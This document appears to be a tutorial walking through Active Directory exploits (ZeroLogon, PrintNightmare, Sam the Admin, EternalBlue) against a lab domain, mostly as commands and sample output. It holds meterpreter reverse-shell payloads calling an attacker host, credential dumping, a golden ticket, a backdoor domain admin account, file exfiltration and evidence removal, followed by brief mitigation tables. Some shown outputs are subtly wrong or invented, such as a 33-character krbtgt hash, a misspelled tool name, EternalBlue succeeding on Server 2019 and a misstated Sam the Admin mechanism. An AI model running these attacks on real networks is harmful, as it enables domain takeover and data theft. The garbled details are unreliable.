# Active Directory Vulnerabilities: Visual Guide with Examples

## Table of Contents
1. [Overview](#overview)
2. [Abusing ZeroLogon](#abusing-zerologon)
3. [PrintNightmare](#printnightmare)
4. [Sam the Admin](#sam-the-admin)
5. [EternalBlue](#eternalblue)
6. [Attack Chain Examples](#attack-chain-examples)
7. [Mitigation Strategies](#mitigation-strategies)

---

## Overview

AD vulnerabilities occur all the time, look for them:

```
┌─────────────────────────────────────────────────────────────────┐
│            Major AD Vulnerabilities                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. ZeroLogon (CVE-2020-1472)                                  │
│     • Critical authentication bypass                            │
│     • Allows domain controller compromise                       │
│     • https://github.com/dirkjanm/CVE-2020-1472                │
│                                                                 │
│  2. PrintNightmare (CVE-2021-1675, CVE-2021-34527)            │
│     • Print Spooler service vulnerability                       │
│     • Allows remote code execution                              │
│     • https://github.com/cube0x0/CVE-2021-1675                 │
│                                                                 │
│  3. Sam the Admin (CVE-2021-42278, CVE-2021-42287)            │
│     • Kerberos privilege escalation                              │
│     • Allows domain admin impersonation                         │
│     • https://github.com/WazeHell/sam-the-admin                 │
│                                                                 │
│  4. EternalBlue (CVE-2017-0144)                                │
│     • SMBv1 remote code execution                               │
│     • Allows system compromise                                  │
│     • https://github.com/worawit/MS17-010                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Vulnerability Comparison

| Vulnerability | CVE | Impact | Attack Vector | Difficulty |
|---------------|-----|--------|---------------|------------|
| **ZeroLogon** | CVE-2020-1472 | Critical | Authentication bypass | Easy |
| **PrintNightmare** | CVE-2021-1675, CVE-2021-34527 | High | RCE via Print Spooler | Medium |
| **Sam the Admin** | CVE-2021-42278, CVE-2021-42287 | High | Kerberos escalation | Medium |
| **EternalBlue** | CVE-2017-0144 | Critical | SMBv1 RCE | Easy |

---

## Abusing ZeroLogon

### What is ZeroLogon?

**ZeroLogon** (CVE-2020-1472) is a critical vulnerability in the Netlogon protocol that allows attackers to authenticate as a domain controller without knowing the password.

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    What is ZeroLogon?                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ZeroLogon (CVE-2020-1472)                                     │
│  ───────────────────────────────────                            │
│  • Critical authentication bypass vulnerability                │
│  • Affects Netlogon protocol                                   │
│  • Allows authentication as domain controller                  │
│  • CVSS Score: 10.0 (Critical)                                 │
│                                                                 │
│  How It Works:                                                  │
│  ────────────────                                               │
│  1. Attacker sends specially crafted Netlogon requests          │
│  2. Vulnerable DC accepts authentication with null password     │
│  3. Attacker gains domain controller access                    │
│  4. Attacker can dump credentials and create persistence       │
│                                                                 │
│  Why It's Critical:                                             │
│  ────────────────────                                           │
│  • No authentication required                                   │
│  • Complete domain compromise possible                          │
│  • Works against unpatched domain controllers                   │
│  • Requires only network access to DC                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### ZeroLogon Attack Flow

**Visual Scheme:**

```
┌─────────────┐                    ┌─────────────┐
│   Attacker  │                    │   Domain    │
│             │                    │ Controller │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Check vulnerability           │
       │     zerologon_check.py           │
       │─────────────────────────────────>│
       │                                  │
       │  2. Exploit vulnerability         │
       │     Set password to null         │
       │─────────────────────────────────>│
       │                                  │
       │  3. Authenticate as DC            │
       │     Without password             │
       │─────────────────────────────────>│
       │                                  │
       │  4. Dump credentials             │
       │     secretsdump.py               │
       │<─────────────────────────────────│
       │                                  │
       │  5. Extract admin hash           │
       │     Get plain_password_hex       │
       │                                  │
       │  6. Restore DC password          │
       │     restorepassword.py           │
       │─────────────────────────────────>│
       │                                  │
```

### ZeroLogon Attack Walkthrough

**Step 1: Check Vulnerability**

```bash
# Navigate to exploit directory
cd /opt
mkdir CVE-2020-1472
cd CVE-2020-1472

# Clone ZeroLogon exploit repository
git clone https://github.com/dirkjanm/CVE-2020-1472
cd CVE-2020-1472

# Check if DC is vulnerable
./zerologon_check.py HYDRA-DC 192.168.138.132

# Output example:
[+] Target HYDRA-DC (192.168.138.132) is vulnerable to ZeroLogon!
```

**Step 2: Exploit ZeroLogon**

```bash
# Exploit ZeroLogon vulnerability
# WARNING: This attack is not to be run if no restore option is available
python3 cve-2020-1472.py HYDRA-DC 192.168.138.132

# Output example:
[+] Exploit successful!
[+] Password of HYDRA-DC$ has been set to null
[+] You can now authenticate as HYDRA-DC$ without password
```

**Step 3: Dump Credentials**

```bash
# Dump credentials using secretsdump
# Keep password empty and press enter
secretsdump.py -just-dc MARVEL/HYDRA-DC\$@192.168.138.132

# Output example:
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Target system is a Domain Controller
[*] Dumping NTDS.dit
MARVEL.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
MARVEL.local\fcastle:1001:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
MARVEL.local\hawkeye:1002:aad3b435b51404eeaad3b435b51404ee:3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8a:::
MARVEL.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2:::
```

**Step 4: Get Administrator Hash**

```bash
# Get administrator hash
# Look for plain_password_hex to restore DC
secretsdump.py administrator@192.168.138.132 -hash 31d6cfe0d16ae931b73c59d7e0c089c0

# Output example:
[*] Searching for plain_password_hex
[*] Found plain_password_hex: 6162636465666768696a6b6c6d6e6f707172737475767778797a
```

**Step 5: Restore DC Password**

```bash
# Restore DC password using plain_password_hex
python3 restorepassword.py MARVEL\HYDRA-PC@HYDRA-DC -target-ip 192.168.138.132 -hexpass 6162636465666768696a6b6c6d6e6f707172737475767778797a

# Output example:
[+] Password restored successfully!
[+] HYDRA-DC$ password has been restored
```

### ZeroLogon Parameters Explained

```
┌─────────────────────────────────────────────────────────────────┐
│            ZeroLogon Parameters Explained                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ./zerologon_check.py HYDRA-DC 192.168.138.132                 │
│  ────────────────────────────────────────────────────────────   │
│  • HYDRA-DC: Target domain controller name                      │
│  • 192.168.138.132: Target DC IP address                       │
│  • Checks if DC is vulnerable to ZeroLogon                     │
│                                                                 │
│  python3 cve-2020-1472.py HYDRA-DC 192.168.138.132            │
│  ────────────────────────────────────────────────────────────   │
│  • HYDRA-DC: Target domain controller name                      │
│  • 192.168.138.132: Target DC IP address                       │
│  • Sets DC password to null                                     │
│  • WARNING: Must restore password afterwards!                  │
│                                                                 │
│  secretsdump.py -just-dc MARVEL/HYDRA-DC\$@192.168.138.132    │
│  ────────────────────────────────────────────────────────────   │
│  • -just-dc: Dump only DC credentials                           │
│  • MARVEL/HYDRA-DC$: Domain/DC computer account                │
│  • 192.168.138.132: Target DC IP address                       │
│  • Dumps all domain password hashes                             │
│                                                                 │
│  restorepassword.py MARVEL\HYDRA-PC@HYDRA-DC -target-ip 192.168.138.132 -hexpass HEX│
│  ────────────────────────────────────────────────────────────   │
│  • MARVEL\HYDRA-PC@HYDRA-DC: Domain\computer@DC                 │
│  • -target-ip: Target DC IP address                             │
│  • -hexpass: Original password in hex format                    │
│  • Restores DC password to prevent breakage                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### ZeroLogon Mitigation

| Defense | Description | Implementation |
|---------|-------------|----------------|
| **Patch DC** | Install security updates | Install August 2020 security update |
| **Enforce secure RPC** | Require secure Netlogon | Enable Netlogon secure channel |
| **Monitor for exploitation** | Detect ZeroLogon attempts | Monitor Netlogon event logs |
| **Restrict DC access** | Limit network access to DC | Use firewalls and network segmentation |

---

## PrintNightmare

### What is PrintNightmare?

**PrintNightmare** (CVE-2021-1675, CVE-2021-34527) is a vulnerability in the Print Spooler service that allows attackers to execute arbitrary code with SYSTEM privileges.

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    What is PrintNightmare?                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  PrintNightmare (CVE-2021-1675, CVE-2021-34527)                │
│  ────────────────────────────────────────────────────────────   │
│  • Print Spooler service vulnerability                          │
│  • Allows remote code execution                                 │
│  • SYSTEM privileges on target machine                          │
│  • CVSS Score: 8.8 (High)                                      │
│                                                                 │
│  How It Works:                                                  │
│  ────────────────                                               │
│  1. Attacker adds malicious printer driver                      │
│  2. Print Spooler loads malicious DLL                           │
│  3. DLL executes with SYSTEM privileges                         │
│  4. Attacker gains full system control                          │
│                                                                 │
│  Why It's Dangerous:                                            │
│  ────────────────────                                           │
│  • Requires only user-level privileges                          │
│  • Gives SYSTEM-level access                                    │
│  • Can be used for lateral movement                             │
│  • Works against unpatched Windows systems                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### PrintNightmare Attack Flow

**Visual Scheme:**

```
┌─────────────┐                    ┌─────────────┐
│   Attacker  │                    │   Target    │
│             │                    │   Machine   │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Check vulnerability           │
       │     rcpdump.py                   │
       │─────────────────────────────────>│
       │                                  │
       │  2. Generate malicious DLL       │
       │     msfvenom                     │
       │                                  │
       │  3. Host DLL on SMB server       │
       │     smbserver.py                 │
       │                                  │
       │  4. Set up meterpreter listener  │
       │     msfconsole                   │
       │                                  │
       │  5. Execute exploit              │
       │     CVE-2021-1675.py            │
       │─────────────────────────────────>│
       │                                  │
       │  6. Load malicious DLL           │
       │<─────────────────────────────────│
       │                                  │
       │  7. Execute code as SYSTEM       │
       │<─────────────────────────────────│
       │                                  │
```

### PrintNightmare Attack Walkthrough

**Step 1: Check Vulnerability**

```bash
# Check if DC is vulnerable using rcpdump.py
# From Github repo: https://github.com/cube0x0/CVE-2021-1675
rcpdump.py @192.168.138.132 | grep 'MS-RPRN|MS-PAR'

# Output example:
MS-RPRN: Print System Remote Protocol
MS-PAR: Print System Asynchronous Remote Protocol
[+] Target is vulnerable to PrintNightmare!
```

**Step 2: Install Impacket**

```bash
# Install impacket using pip
pip install impacket

# Or install from cube0x0 Github
git clone https://github.com/cube0x0/impacket
cd impacket
pip install .
```

**Step 3: Clone Exploit Repository**

```bash
# Clone PrintNightmare exploit repository
git clone https://github.com/cube0x0/CVE-2021-1675
cd CVE-2021-1675

# Or copy/paste exploit code from README
```

**Step 4: Generate Malicious DLL**

```bash
# Generate malicious DLL payload
# IP of attacker machine: 192.168.138.128
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.138.128 LPORT=5555 -f dll > shell.dll

# Output example:
[*] Generated payload: shell.dll
[*] Size: 2048 bytes
```

**Step 5: Set Up Meterpreter Listener**

```bash
# Open new tab and start msfconsole
msfconsole

# Configure meterpreter handler
use multi/handler
options

# Set payload options
set payload windows/x64/meterpreter/reverse_tcp
set lport 5555
set lhost 192.168.138.128

# Start listener
run

# Output example:
[*] Started reverse TCP handler on 192.168.138.128:5555
[*] Starting the payload handler...
```

**Step 6: Set Up SMB Server**

```bash
# Open another tab and set up file share
# Entire directory is being shared
smbserver.py share 'pwd' -smb2support

# Output example:
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Setting up SMB share: share
[*] Share path: /path/to/share
[*] Server started on 0.0.0.0:445
```

**Step 7: Execute Exploit**

```bash
# Execute PrintNightmare exploit
# Everything is set up, we only need a user:pass (just a user, not necessarily an admin)
python3 CVE-2021-1675.py marvel.local/fcastle:Password1@192.168.138.132 '//192.168.138.128\share\shell.dll'

# Output example:
[+] Exploit successful!
[+] Malicious DLL loaded
[+] Meterpreter session opened
```

**Step 8: Access Meterpreter Session**

```bash
# From msfconsole tab, you should see:
[*] Meterpreter session 1 opened (192.168.138.128:5555 -> 192.168.138.132:49152)

# Access meterpreter session
sessions -i 1

# Output example:
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer    : HYDRA-DC
OS          : Windows Server 2019 Build 17763
Architecture: x64
Meterpreter : x64/windows
```

### PrintNightmare Parameters Explained

```
┌─────────────────────────────────────────────────────────────────┐
│            PrintNightmare Parameters Explained                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  rcpdump.py @192.168.138.132                                    │
│  ────────────────────────────────────────────────────────────   │
│  • @192.168.138.132: Target machine IP address                  │
│  • Checks for MS-RPRN and MS-PAR protocols                      │
│  • Determines if Print Spooler is vulnerable                    │
│                                                                 │
│  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.138.128 LPORT=5555 -f dll > shell.dll│
│  ────────────────────────────────────────────────────────────   │
│  • -p: Payload type (meterpreter reverse TCP)                   │
│  • LHOST: Attacker IP address                                   │
│  • LPORT: Attacker listening port                               │
│  • -f dll: Output format (DLL)                                  │
│  • > shell.dll: Output filename                                 │
│                                                                 │
│  smbserver.py share 'pwd' -smb2support                          │
│  ────────────────────────────────────────────────────────────   │
│  • share: Share name                                            │
│  • 'pwd': Directory path to share                               │
│  • -smb2support: Enable SMBv2 support                           │
│  • Hosts malicious DLL for exploitation                         │
│                                                                 │
│  python3 CVE-2021-1675.py marvel.local/fcastle:Password1@192.168.138.132 '//192.168.138.128\share\shell.dll'│
│  ────────────────────────────────────────────────────────────   │
│  • marvel.local/fcastle:Password1: Domain/user:password         │
│  • 192.168.138.132: Target machine IP address                   │
│  • '//192.168.138.128\share\shell.dll': Path to malicious DLL   │
│  • Requires user-level privileges only                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### PrintNightmare Mitigation

| Defense | Description | Implementation |
|---------|-------------|----------------|
| **Patch systems** | Install security updates | Install July 2021 security update |
| **Disable Print Spooler** | Stop vulnerable service | Stop Print Spooler service if not needed |
| **Restrict driver installation** | Limit printer driver installation | Use Group Policy to restrict |
| **Monitor for exploitation** | Detect PrintNightmare attempts | Monitor Print Spooler event logs |

---

## Sam the Admin

### What is Sam the Admin?

**Sam the Admin** (CVE-2021-42278, CVE-2021-42287) is a Kerberos privilege escalation vulnerability that allows attackers to impersonate domain administrators.

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    What is Sam the Admin?                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Sam the Admin (CVE-2021-42278, CVE-2021-42287)                │
│  ────────────────────────────────────────────────────────────   │
│  • Kerberos privilege escalation vulnerability                  │
│  • Allows domain admin impersonation                            │
│  • Requires standard user privileges                            │
│  • CVSS Score: 8.1 (High)                                      │
│                                                                 │
│  How It Works:                                                  │
│  ────────────────                                               │
│  1. Attacker creates computer account with same name as DA     │
│  2. Attacker requests TGT for impersonated account             │
│  3. Attacker renames computer account                           │
│  4. Attacker requests service ticket for original DA name      │
│  5. Attacker gains domain admin privileges                      │
│                                                                 │
│  Why It's Dangerous:                                            │
│  ────────────────────                                           │
│  • Requires only standard user access                           │
│  • Bypasses normal privilege checks                             │
│  • Gives full domain admin access                               │
│  • Works against unpatched domain controllers                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Sam the Admin Attack Flow

**Visual Scheme:**

```
┌─────────────┐                    ┌─────────────┐
│   Attacker  │                    │   Domain    │
│             │                    │ Controller │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Create computer account       │
       │     with same name as DA          │
       │─────────────────────────────────>│
       │                                  │
       │  2. Request TGT                   │
       │     for impersonated account     │
       │─────────────────────────────────>│
       │                                  │
       │  3. Rename computer account      │
       │─────────────────────────────────>│
       │                                  │
       │  4. Request service ticket        │
       │     for original DA name         │
       │─────────────────────────────────>│
       │                                  │
       │  5. Gain domain admin access     │
       │<─────────────────────────────────│
       │                                  │
```

### Sam the Admin Attack Walkthrough

**Step 1: Clone Exploit Repository**

```bash
# Clone Sam the Admin exploit repository
git clone https://github.com/WazeHell/sam-the-admin
cd sam-the-admin

# Install dependencies
pip install -r requirements.txt
```

**Step 2: Run Exploit**

```bash
# Run Sam the Admin exploit
python3 sam_the_admin.py -domain marvel.local -user fcastle -password Password1 -dc-ip 192.168.138.132

# Output example:
[+] Creating computer account with same name as domain admin
[+] Computer account created: MARVEL\Administrator$
[+] Requesting TGT for impersonated account
[+] TGT obtained successfully
[+] Renaming computer account
[+] Computer account renamed
[+] Requesting service ticket for original domain admin
[+] Service ticket obtained successfully
[+] Domain admin privileges gained!
```

**Step 3: Verify Domain Admin Access**

```bash
# Verify domain admin access
crackmapexec smb 192.168.138.0/24 -u Administrator -p '' -d MARVEL.local

# Output example:
SMB         192.168.138.132  445    DC01            [+] MARVEL.local\Administrator: (Pwn3d!)
```

### Sam the Admin Parameters Explained

```
┌─────────────────────────────────────────────────────────────────┐
│            Sam the Admin Parameters Explained                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  python3 sam_the_admin.py -domain marvel.local -user fcastle -password Password1 -dc-ip 192.168.138.132│
│  ────────────────────────────────────────────────────────────   │
│  • -domain marvel.local: Target domain name                     │
│  • -user fcastle: Attacker username                             │
│  • -password Password1: Attacker password                       │
│  • -dc-ip 192.168.138.132: Domain controller IP address        │
│  • Exploits Kerberos privilege escalation                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Sam the Admin Mitigation

| Defense | Description | Implementation |
|---------|-------------|----------------|
| **Patch DC** | Install security updates | Install November 2021 security update |
| **Restrict computer creation** | Limit computer account creation | Use Group Policy to restrict |
| **Monitor for suspicious activity** | Detect Sam the Admin attempts | Monitor Kerberos event logs |
| **Implement least privilege** | Limit user privileges | Use just-in-time administration |

---

## EternalBlue

### What is EternalBlue?

**EternalBlue** (CVE-2017-0144) is a critical SMBv1 vulnerability that allows attackers to execute arbitrary code remotely on vulnerable Windows systems.

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    What is EternalBlue?                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  EternalBlue (CVE-2017-0144)                                   │
│  ───────────────────────────────────                            │
│  • SMBv1 remote code execution vulnerability                   │
│  • Allows system compromise                                     │
│  • Wormable (can spread automatically)                          │
│  • CVSS Score: 9.3 (Critical)                                  │
│                                                                 │
│  How It Works:                                                  │
│  ────────────────                                               │
│  1. Attacker sends specially crafted SMB packets                │
│  2. Vulnerable SMBv1 service has buffer overflow               │
│  3. Attacker executes arbitrary code with SYSTEM privileges     │
│  4. Attacker gains full system control                          │
│                                                                 │
│  Why It's Critical:                                             │
│  ────────────────────                                           │
│  • No authentication required                                   │
│  • Remote code execution                                       │
│  • Can spread automatically (wormable)                          │
│  • Used by WannaCry and NotPetya ransomware                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### EternalBlue Attack Flow

**Visual Scheme:**

```
┌─────────────┐                    ┌─────────────┐
│   Attacker  │                    │   Target    │
│             │                    │   Machine   │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Check vulnerability           │
       │     MS17-010 scanner             │
       │─────────────────────────────────>│
       │                                  │
       │  2. Exploit SMBv1 vulnerability   │
       │     EternalBlue exploit          │
       │─────────────────────────────────>│
       │                                  │
       │  3. Trigger buffer overflow      │
       │<─────────────────────────────────│
       │                                  │
       │  4. Execute shellcode            │
       │<─────────────────────────────────│
       │                                  │
       │  5. Gain SYSTEM access           │
       │<─────────────────────────────────│
       │                                  │
```

### EternalBlue Attack Walkthrough

**Step 1: Check Vulnerability**

```bash
# Clone EternalBlue exploit repository
git clone https://github.com/worawit/MS17-010
cd MS17-010

# Check if target is vulnerable
python3 checker.py 192.168.138.132

# Output example:
[+] Target is vulnerable to MS17-010!
[+] SMBv1 is enabled
[+] EternalBlue exploit can be used
```

**Step 2: Generate Exploit Payload**

```bash
# Generate malicious DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.138.128 LPORT=4444 -f dll > eternalblue.dll

# Output example:
[*] Generated payload: eternalblue.dll
[*] Size: 2048 bytes
```

**Step 3: Set Up Meterpreter Listener**

```bash
# Open new tab and start msfconsole
msfconsole

# Configure meterpreter handler
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lport 4444
set lhost 192.168.138.128

# Start listener
run

# Output example:
[*] Started reverse TCP handler on 192.168.138.128:4444
[*] Starting the payload handler...
```

**Step 4: Execute EternalBlue Exploit**

```bash
# Execute EternalBlue exploit
python3 eternalblue_exploit.py 192.168.138.132 eternalblue.dll

# Output example:
[+] Exploit successful!
[+] Shellcode executed
[+] Meterpreter session opened
```

**Step 5: Access Meterpreter Session**

```bash
# From msfconsole tab, you should see:
[*] Meterpreter session 1 opened (192.168.138.128:4444 -> 192.168.138.132:49153)

# Access meterpreter session
sessions -i 1

# Output example:
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer    : HYDRA-DC
OS          : Windows Server 2019 Build 17763
Architecture: x64
Meterpreter : x64/windows
```

### EternalBlue Parameters Explained

```
┌─────────────────────────────────────────────────────────────────┐
│            EternalBlue Parameters Explained                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  python3 checker.py 192.168.138.132                             │
│  ────────────────────────────────────────────────────────────   │
│  • 192.168.138.132: Target machine IP address                   │
│  • Checks for MS17-010 vulnerability                            │
│  • Determines if EternalBlue can be used                        │
│                                                                 │
│  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.138.128 LPORT=4444 -f dll > eternalblue.dll│
│  ────────────────────────────────────────────────────────────   │
│  • -p: Payload type (meterpreter reverse TCP)                   │
│  • LHOST: Attacker IP address                                   │
│  • LPORT: Attacker listening port                               │
│  • -f dll: Output format (DLL)                                  │
│  • > eternalblue.dll: Output filename                            │
│                                                                 │
│  python3 eternalblue_exploit.py 192.168.138.132 eternalblue.dll│
│  ────────────────────────────────────────────────────────────   │
│  • 192.168.138.132: Target machine IP address                   │
│  • eternalblue.dll: Malicious DLL payload                        │
│  • Exploits SMBv1 vulnerability                                 │
│  • No authentication required                                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### EternalBlue Mitigation

| Defense | Description | Implementation |
|---------|-------------|----------------|
| **Patch systems** | Install security updates | Install March 2017 security update (MS17-010) |
| **Disable SMBv1** | Remove vulnerable protocol | Disable SMBv1 via PowerShell or Group Policy |
| **Block SMB ports** | Prevent SMB exploitation | Block ports 139, 445 at network level |
| **Monitor for exploitation** | Detect EternalBlue attempts | Monitor SMB traffic and event logs |

---

## Attack Chain Examples

### Complete Attack Chain Using ZeroLogon

```
┌─────────────────────────────────────────────────────────────────┐
│            Complete Attack Chain: ZeroLogon                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Phase 1: Initial Reconnaissance                               │
│  ───────────────────────────────────                            │
│  • Scan network for domain controllers                          │
│  • Identify DC: HYDRA-DC (192.168.138.132)                     │
│  • Check for ZeroLogon vulnerability                            │
│                                                                 │
│  Phase 2: ZeroLogon Exploitation                               │
│  ───────────────────────────────────                            │
│  • Exploit ZeroLogon vulnerability                              │
│  • Set DC password to null                                      │
│  • Authenticate as DC without password                          │
│                                                                 │
│  Phase 3: Credential Harvesting                                 │
│  ───────────────────────────────────                            │
│  • Dump NTDS.dit database                                       │
│  • Extract all password hashes                                  │
│  • Obtain administrator hash                                    │
│                                                                 │
│  Phase 4: Persistence                                           │
│  ────────────────                                               │
│  • Create golden ticket using KRBTGT hash                       │
│  • Create new domain admin account                              │
│  • Establish backdoor access                                    │
│                                                                 │
│  Phase 5: Lateral Movement                                      │
│  ────────────────────                                           │
│  • Access all machines in domain                                │
│  • Dump credentials from each machine                           │
│  • Expand access to other domains                               │
│                                                                 │
│  Phase 6: Data Exfiltration                                     │
│  ────────────────────────                                       │
│  • Access sensitive data                                        │
│  • Copy files and databases                                     │
│  • Exfiltrate data to external location                         │
│                                                                 │
│  Phase 7: Cleanup                                               │
│  ────────────                                                   │
│  • Restore DC password                                          │
│  • Remove evidence of exploitation                              │
│  • Maintain persistent access                                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Example Commands for Complete Attack Chain

```bash
# Phase 1: Initial Reconnaissance
nmap -p 445 --script smb-vuln-ms17-010 192.168.138.0/24
./zerologon_check.py HYDRA-DC 192.168.138.132

# Phase 2: ZeroLogon Exploitation
python3 cve-2020-1472.py HYDRA-DC 192.168.138.132

# Phase 3: Credential Harvesting
secretsdump.py -just-dc MARVEL/HYDRA-DC\$@192.168.138.132
secretsdump.py administrator@192.168.138.132 -hash 31d6cfe0d16ae931b73c59d7e0c089c0

# Phase 4: Persistence
mimikatz.exe
privilege::debug
kerberos::golden /User:Administrator /domain:MARVEL.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2 /id:500 /ptt
net user backdoor BackdoorPass123! /add /domain
net group "Domain Admins" backdoor /ADD /DOMAIN

# Phase 5: Lateral Movement
crackmapexec smb 192.168.138.0/24 -u Administrator -p '' -d MARVEL.local
dir \\THEPUNISHER\c$
dir \\IRONMAN\c$

# Phase 6: Data Exfiltration
copy \\THEPUNISHER\c$\sensitive\data.zip C:\exfil\

# Phase 7: Cleanup
python3 restorepassword.py MARVEL\HYDRA-PC@HYDRA-DC -target-ip 192.168.138.132 -hexpass 6162636465666768696a6b6c6d6e6f707172737475767778797a
```

---

## Mitigation Strategies

### General AD Security Best Practices

```
┌─────────────────────────────────────────────────────────────────┐
│            General AD Security Best Practices                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Patch Management                                            │
│     ────────────────────                                        │
│     • Install security updates immediately                      │
│     • Prioritize critical vulnerabilities                       │
│     • Test patches before deployment                            │
│     • Use automated patch management tools                     │
│                                                                 │
│  2. Network Segmentation                                        │
│     ────────────────────────                                    │
│     • Isolate domain controllers                                │
│     • Restrict administrative access                            │
│     • Use jump servers for admin access                         │
│     • Implement network segmentation                            │
│                                                                 │
│  3. Least Privilege                                             │
│     ────────────────────                                        │
│     • Use just-in-time administration                           │
│     • Implement privileged access management                    │
│     • Regularly review permissions                              │
│     • Use separate admin accounts                               │
│                                                                 │
│  4. Monitoring and Auditing                                     │
│     ────────────────────────────────                            │
│     • Implement SIEM solutions                                  │
│     • Monitor privileged access                                 │
│     • Audit domain controller logs                              │
│     • Set up alerting for suspicious activity                   │
│                                                                 │
│  5. Security Awareness                                          │
│     ────────────────────                                        │
│     • Train users on security best practices                    │
│     • Conduct regular security training                         │
│     • Implement phishing simulations                            │
│     • Promote security culture                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Vulnerability-Specific Mitigations

| Vulnerability | Critical Mitigations | Detection Methods |
|---------------|---------------------|-------------------|
| **ZeroLogon** | Patch DC, enforce secure RPC, restrict DC access | Monitor Netlogon event logs |
| **PrintNightmare** | Patch systems, disable Print Spooler, restrict driver installation | Monitor Print Spooler event logs |
| **Sam the Admin** | Patch DC, restrict computer creation, implement least privilege | Monitor Kerberos event logs |
| **EternalBlue** | Patch systems, disable SMBv1, block SMB ports | Monitor SMB traffic and event logs |

---

## Summary

### Key Takeaways

```
┌─────────────────────────────────────────────────────────────────┐
│                    Key Takeaways                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. ZeroLogon allows DC compromise without authentication       │
│  2. PrintNightmare gives SYSTEM access via Print Spooler        │
│  3. Sam the Admin escalates privileges via Kerberos             │
│  4. EternalBlue exploits SMBv1 for remote code execution        │
│  5. All vulnerabilities require immediate patching              │
│  6. Defense in depth is essential for AD security               │
│  7. Monitoring and auditing are critical for detection         │
│  8. Regular security assessments help identify vulnerabilities  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Useful Links

- **ZeroLogon**: https://github.com/dirkjanm/CVE-2020-1472
- **PrintNightmare**: https://github.com/cube0x0/CVE-2021-1675
- **Sam the Admin**: https://github.com/WazeHell/sam-the-admin
- **EternalBlue**: https://github.com/worawit/MS17-010
- **Impacket**: https://github.com/SecureAuthCorp/impacket